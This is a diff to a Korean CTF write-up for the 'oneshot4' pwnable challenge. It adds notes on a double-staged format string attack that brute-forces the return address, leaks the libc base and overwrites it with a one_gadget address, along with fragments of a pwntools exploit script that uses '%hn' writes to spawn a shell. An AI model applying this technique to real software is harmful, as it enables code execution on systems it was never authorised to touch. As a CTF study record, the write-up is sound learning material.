@@ -246,8 +246,11 @@ exit 함수가 존재하지 않으므로 다른 방식의 fsb를 해야 한다.
 
 ## oneshot4
 
-전역변수 buf에 입력을 받는 상황이기 때문에 double-staged fsb를 해야 한다.
-
+전역변수 buf에 입력을 받는 상황이기 때문에 double-staged fsb를 해야 한다.  
+ret의 주소와 37번째 입력값이 마지막 2바이트만 다르기 때문에 brute force를 통해 ret를 가리키도록 해야 할 것 같다.
+브루트 포스를 하는 과정에서 ret와 libc_base를 알아낼 수 있다. 또한 스택과 관련이 없는 부분들은 무시하고 관련이 있는 부분들만 출력한다. 9번째에서 0x48로 길이를 맞춘 뒤 입력하고, 15번째 출력 과정에서 입력한 값(ret+0xe8)을 가지고 있는지 확인하고 아니면 다시 시작한다. 이후에 길이를 맞추고 main으로 다시 돌아가도록 한다. 마지막 바이트를 0x99로 변경한다.
+이 과정을 통해 onegadget을 알 수 있을 것이고, 3회에 걸쳐 onegadget을 입력할 수 있다. 원하는 값을 계산하여 2바이트씩 길이를 맞추어 입력하면 된다.
+도움을 받았음에도 매우 어려웠던 것 같다.
 
 
 ```python
@@ -266,8 +269,7 @@ while True:
     p.close()
     
 libc_base=int(line[0x30:0x3e,16)-0x270b3
-
-
+one_gadget=libc_base+0xe6c81
 
 p.recvline()
 p.recv(144)
@@ -280,7 +282,6 @@ payload+=b'x%hn\n'
 payload+=b'\x00'*(0x100-len(payload))
 
 
-one_gadget=libc_base+0xe6c81
 
 p.sendline(payload)
 p.recvline()
@@ -288,4 +289,5 @@ p.interactive()
 
 
 ```
+
 
